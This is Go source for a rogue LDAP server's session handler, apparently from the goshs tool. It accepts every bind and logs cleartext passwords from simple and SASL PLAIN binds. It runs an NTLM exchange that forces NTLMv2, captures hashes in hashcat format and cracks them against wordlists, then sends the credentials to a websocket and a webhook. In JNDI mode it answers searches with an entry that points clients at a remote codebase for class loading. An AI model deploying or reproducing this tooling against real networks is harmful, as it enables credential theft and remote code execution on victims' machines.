package ldapserver

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"time"

	"goshs.de/goshs/v2/logger"
	"goshs.de/goshs/v2/smbserver"
	"goshs.de/goshs/v2/ws"
)

type session struct {
	conn          net.Conn
	srv           *LDAPServer
	ntlmChallenge *smbserver.NTLMChallenge // non-nil while NTLM round-trip is in progress
}

func newSession(conn net.Conn, srv *LDAPServer) *session {
	return &session{conn: conn, srv: srv}
}

func (s *session) handle() {
	defer s.conn.Close()
	src := s.conn.RemoteAddr().String()
	logger.Debugf("[ldap] connection from %s", src)

	for {
		tag, data, err := readTLV(s.conn)
		if err != nil {
			if err != io.EOF {
				logger.Debugf("[ldap] read error from %s: %v", src, err)
			}
			return
		}
		if tag != tagSequence {
			logger.Debugf("[ldap] unexpected top-level tag 0x%02x from %s", tag, src)
			continue
		}

		r := bytes.NewReader(data)

		mTag, mData, err := readTLV(r)
		if err != nil || mTag != tagInteger {
			return
		}
		msgID := asInt(mData)

		opTag, opData, err := readTLV(r)
		if err != nil {
			return
		}

		logger.Debugf("[ldap] op 0x%02x msgID=%d from %s", opTag, msgID, src)
		switch opTag {
		case tagBindReq:
			s.handleBind(msgID, opData, src)
		case tagUnbindReq:
			return
		case tagSearchReq:
			s.handleSearch(msgID, opData, src)
		default:
			logger.Debugf("[ldap] unhandled op 0x%02x from %s", opTag, src)
		}
	}
}

func (s *session) handleBind(msgID int, data []byte, src string) {
	r := bytes.NewReader(data)

	// version INTEGER — skip
	if _, _, err := readTLV(r); err != nil {
		logger.Debugf("[ldap] handleBind: version read error from %s: %v", src, err)
		return
	}

	// name LDAPDN
	_, nameData, err := readTLV(r)
	if err != nil {
		logger.Debugf("[ldap] handleBind: name read error from %s: %v", src, err)
		return
	}
	dn := string(nameData)

	// authentication CHOICE
	authTag, authData, err := readTLV(r)
	if err != nil {
		logger.Debugf("[ldap] handleBind: auth read error from %s: %v", src, err)
		return
	}

	logger.Debugf("[ldap] handleBind: authTag=0x%02x dn=%q remaining=%d bytes from %s",
		authTag, dn, len(authData), src)

	switch authTag {
	case tagCtxPrim0:
		// Simple bind
		password := string(authData)

		// Suppress anonymous binds — Java JNDI init noise.
		if dn == "" && password == "" {
			if _, err := s.conn.Write(buildBindResponse(msgID)); err != nil {
				logger.Debugf("[ldap] write bind response: %v", err)
			}
			return
		}

		logger.Infof("[ldap] bind from %s  dn=%q  password=%q", src, dn, password)

		event := ws.LDAPEvent{
			Type:      "ldap",
			Operation: "bind",
			DN:        dn,
			Password:  password,
			Source:    src,
			Timestamp: time.Now(),
		}
		if b, err := json.Marshal(event); err == nil {
			s.srv.Hub.Broadcast <- b
		}

		if s.srv.WebHook != nil {
			msg := fmt.Sprintf("LDAP bind from %s\nDN: %s\nPassword: %s", src, dn, password)
			logger.HandleWebhookSend(msg, "ldap", *s.srv.WebHook)
		}

		if _, err := s.conn.Write(buildBindResponse(msgID)); err != nil {
			logger.Debugf("[ldap] write bind response: %v", err)
		}

	case tagCtxPrim9:
		// Microsoft proprietary NTLM bind ([9] IMPLICIT OCTET STRING).
		// Leg 1: client sends empty credentials to announce NTLM intent.
		// Leg 2: client sends NTLM Type 3 Authenticate.
		// Both legs are handled by handleNTLMBind via s.ntlmChallenge state.
		s.handleNTLMBind(msgID, authData, src)

	default:
		logger.Debugf("[ldap] handleBind: unrecognised authTag=0x%02x from %s — sending success", authTag, src)
		if _, err := s.conn.Write(buildBindResponse(msgID)); err != nil {
			logger.Debugf("[ldap] handleBind: write error: %v", err)
		}

	case tagCtxCons3:
		// SASL bind
		ar := bytes.NewReader(authData)
		_, mechData, _ := readTLV(ar)
		mech := string(mechData)
		_, credData, _ := readTLV(ar)

		switch mech {
		case "NTLM":
			s.handleNTLMBind(msgID, credData, src)

		case "PLAIN":
			var password string
			if len(credData) > 0 {
				parts := bytes.SplitN(credData, []byte{0}, 3)
				if len(parts) == 3 {
					password = fmt.Sprintf("[SASL PLAIN] user=%s pass=%s", parts[1], parts[2])
				}
			}
			logger.Infof("[ldap] SASL PLAIN bind from %s  dn=%q  password=%q", src, dn, password)

			event := ws.LDAPEvent{
				Type:      "ldap",
				Operation: "bind",
				DN:        dn,
				Password:  password,
				Source:    src,
				Timestamp: time.Now(),
			}
			if b, err := json.Marshal(event); err == nil {
				s.srv.Hub.Broadcast <- b
			}

			if s.srv.WebHook != nil {
				msg := fmt.Sprintf("LDAP SASL PLAIN bind from %s\nDN: %s\nPassword: %s", src, dn, password)
				logger.HandleWebhookSend(msg, "ldap", *s.srv.WebHook)
			}

			if _, err := s.conn.Write(buildBindResponse(msgID)); err != nil {
				logger.Debugf("[ldap] write bind response: %v", err)
			}

		default:
			logger.Debugf("[ldap] unsupported SASL mechanism %q from %s", mech, src)
			if _, err := s.conn.Write(buildBindResponse(msgID)); err != nil {
				logger.Debugf("[ldap] write bind response: %v", err)
			}
		}
	}
}

// handleNTLMBind manages the two-leg SASL NTLM exchange:
//
//	Leg 1 — client sends Type 1 (Negotiate) → server replies saslBindInProgress + Type 2 (Challenge)
//	Leg 2 — client sends Type 3 (Authenticate) → server extracts hash, replies success
func (s *session) handleNTLMBind(msgID int, ntlmMsg []byte, src string) {
	if s.ntlmChallenge == nil {
		// Leg 1: send NTLM Type 2 Challenge.
		// Force NTLMv2 — ldap3 and most modern clients don't support downgrade.
		challenge, err := smbserver.NewChallenge("GOSHS")
		if err != nil {
			logger.Errorf("[ldap] NTLM new challenge: %v", err)
			return
		}
		challenge.DowngradeLevel = smbserver.DowngradeNTLMv2
		s.ntlmChallenge = challenge
		type2 := challenge.BuildChallengeMessage()
		logger.Debugf("[ldap] NTLM leg 1: sending Type 2 challenge (%d bytes) to %s", len(type2), src)
		resp := buildSASLBindResponse(msgID, 14, type2) // 14 = saslBindInProgress
		if _, err := s.conn.Write(resp); err != nil {
			logger.Debugf("[ldap] NTLM write challenge error: %v", err)
		}
		return
	}

	// Leg 2: parse NTLM Type 3 Authenticate
	logger.Debugf("[ldap] NTLM leg 2: parsing Type 3 from %s (%d bytes)", src, len(ntlmMsg))
	// Some clients wrap NTLM in SPNEGO — unwrap if present.
	inner := smbserver.ExtractNTLM(ntlmMsg)
	if inner == nil {
		inner = ntlmMsg
	}

	captured, err := s.ntlmChallenge.ParseAuthMessage(inner)
	s.ntlmChallenge = nil // reset for next exchange on same connection
	if err != nil {
		logger.Warnf("[ldap] NTLM parse error from %s: %v", src, err)
		if _, err := s.conn.Write(buildBindResponse(msgID)); err != nil {
			logger.Debugf("[ldap] write bind response: %v", err)
		}
		return
	}

	// Try to crack with built-in wordlist first (sub-millisecond).
	cracked, _ := smbserver.TryCrackDefault(captured)
	if cracked != "" {
		logger.Infof("[ldap] NTLM hash from %s: %s (cracked: %q)", src, captured.HashcatLine, cracked)
	} else {
		logger.Infof("[ldap] NTLM hash from %s: %s", src, captured.HashcatLine)
	}

	event := ws.LDAPEvent{
		Type:            "ldap",
		Operation:       "ntlm",
		Username:        captured.Username,
		Domain:          captured.Domain,
		Hash:            captured.HashcatLine,
		HashType:        string(captured.Protocol),
		HashcatMode:     captured.HashcatMode,
		CrackedPassword: cracked,
		Source:          src,
		Timestamp:       time.Now(),
	}
	if b, err := json.Marshal(event); err == nil {
		s.srv.Hub.Broadcast <- b
	}

	if s.srv.WebHook != nil {
		msg := fmt.Sprintf("LDAP NTLM hash from %s\nUser: %s\nDomain: %s\nHash Type: %s\nHashcat Mode: hashcat -m %s\n\n%s",
			src, captured.Username, captured.Domain, string(captured.Protocol), captured.HashcatMode, captured.HashcatLine)
		if cracked != "" {
			msg = fmt.Sprintf("%s\nCracked: %s", msg, cracked)
		}
		logger.HandleWebhookSend(msg, "ldap", *s.srv.WebHook)
	}

	// If a file wordlist is configured and default cracking failed, try it in the background.
	if cracked == "" && s.srv.Wordlist != "" {
		snap := *captured
		go func() {
			if pw, ok := smbserver.TryCrackFile(&snap, s.srv.Wordlist); ok {
				logger.Infof("[ldap] NTLM cracked %s\\%s — plaintext: %s (wordlist)", snap.Domain, snap.Username, pw)
				update := ws.LDAPEvent{
					Type:            "ldap",
					Operation:       "ntlm",
					Username:        snap.Username,
					Domain:          snap.Domain,
					Hash:            snap.HashcatLine,
					HashType:        string(snap.Protocol),
					HashcatMode:     snap.HashcatMode,
					CrackedPassword: pw,
					Source:          src,
					Timestamp:       time.Now(),
				}
				if b, err := json.Marshal(update); err == nil {
					s.srv.Hub.Broadcast <- b
				}

				if s.srv.WebHook != nil {
					msg := fmt.Sprintf("LDAP NTLM cracked (wordlist) from %s\nUser: %s\nDomain: %s\nCracked: %s\n\n%s",
						src, snap.Username, snap.Domain, pw, snap.HashcatLine)
					logger.HandleWebhookSend(msg, "ldap", *s.srv.WebHook)
				}
			}
		}()
	}

	// Always respond success — we're capturing, not validating.
	if _, err := s.conn.Write(buildBindResponse(msgID)); err != nil {
		logger.Debugf("[ldap] write bind response: %v", err)
	}
}

func (s *session) handleSearch(msgID int, data []byte, src string) {
	r := bytes.NewReader(data)

	// baseObject LDAPDN
	_, baseData, err := readTLV(r)
	if err != nil {
		return
	}
	baseDN := string(baseData)

	// Suppress rootDSE queries (empty baseDN) — Java JNDI discovery noise.
	if baseDN == "" {
		if _, err := s.conn.Write(buildSearchDone(msgID, 0)); err != nil {
			logger.Debugf("[ldap] write search done: %v", err)
		}
		return
	}

	logger.Infof("[ldap] search from %s  baseDN=%q", src, baseDN)

	event := ws.LDAPEvent{
		Type:      "ldap",
		Operation: "search",
		DN:        baseDN,
		Source:    src,
		Timestamp: time.Now(),
	}
	if b, err := json.Marshal(event); err == nil {
		s.srv.Hub.Broadcast <- b
	}

	if s.srv.WebHook != nil {
		msg := fmt.Sprintf("LDAP search from %s\nBase DN: %s", src, baseDN)
		logger.HandleWebhookSend(msg, "ldap", *s.srv.WebHook)
	}

	// In JNDI mode the baseDN itself is the factory class name.
	if s.srv.JNDIEnabled {
		entry := buildJNDIEntry(msgID, baseDN, baseDN, s.srv.JNDICodeBase)
		if _, err := s.conn.Write(entry); err != nil {
			logger.Debugf("[ldap] write jndi entry: %v", err)
			return
		}
	}

	if _, err := s.conn.Write(buildSearchDone(msgID, 0)); err != nil {
		logger.Debugf("[ldap] write search done: %v", err)
	}
}
